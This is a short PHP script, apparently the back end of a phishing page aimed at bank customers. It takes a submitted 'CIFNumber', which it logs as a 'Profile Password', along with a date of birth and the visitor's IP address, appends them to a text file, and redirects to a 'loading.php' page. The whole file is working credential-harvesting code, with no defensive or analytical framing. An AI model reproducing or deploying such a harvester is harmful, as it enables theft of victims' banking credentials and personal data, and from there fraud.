<?php
// Function to get the client IP address
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Collect form data
    $cifNumber = htmlspecialchars($_POST['CIFNumber']);
    $birthday = htmlspecialchars($_POST['Birthday']);
    $ipAddress = getClientIP();

    // Save data to a text file
    $file = fopen('data.txt', 'a'); // Open file in append mode
    fwrite($file, "IP Address: $ipAddress\nProfile Password: $cifNumber\nDate of Birth: $birthday\n\n");
    fclose($file);

    // Redirect to a success page or another page
    header('Location: loading.php');
    exit();
}
?>

